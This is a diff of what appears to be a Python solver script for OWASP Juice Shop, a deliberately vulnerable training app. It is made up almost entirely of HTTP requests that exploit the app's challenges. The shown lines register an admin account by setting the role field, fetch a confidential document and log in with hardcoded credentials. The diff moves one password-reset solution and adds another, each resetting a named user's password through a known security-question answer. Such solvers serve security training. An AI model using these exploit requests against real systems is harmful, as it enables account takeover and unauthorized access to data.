@@ -7,8 +7,6 @@ import requests
 requests.post(url+'/api/Users',data={'email':'admin','password':'admin','role':'admin'})
 # ---- Admin Section (Access the administration section of the store.)
 requests.get(url+'/assets/public/images/padding/19px.png')
-# ---- Bjoern's Favorite Pet (Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question.)
-requests.post(url+'/rest/user/reset-password',data={'email':'bjoern@owasp.org','answer':'Zaya','new':'bjoern','repeat':'bjoern'})
 # ---- Confidential Document (Access a confidential document.)
 requests.get(url+'/ftp/acquisitions.md')
 # ---- Database Schema (Exfiltrate the entire DB schema definition via SQL Injection.)
@@ -57,6 +55,12 @@ requests.post(url+'/rest/user/login', data={'email':'mc.safesearch@juice-sh.op',
 requests.post(url+'/rest/user/login', data={'email':'support@juice-sh.op','password':'J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P'})
 # ---- Password Strength (Log in with the administrator's user credentials without previously changing them or applying SQL Injection.)
 # See "Login Admin" in this part
+
+# ==== No required action - Change password challenges ====
+# ---- Bjoern's Favorite Pet (Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question.)
+requests.post(url+'/rest/user/reset-password',data={'email':'bjoern@owasp.org','answer':'Zaya','new':'bjoern','repeat':'bjoern'})
+# ---- Reset Jim's Password (Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.)
+requests.post(url+'/rest/user/reset-password',data={'email':'jim@juice-sh.op','answer':'Samuel','new':'jimjim','repeat':'jimjim'})
 
 # ==== Captcha ===
 from json import loads
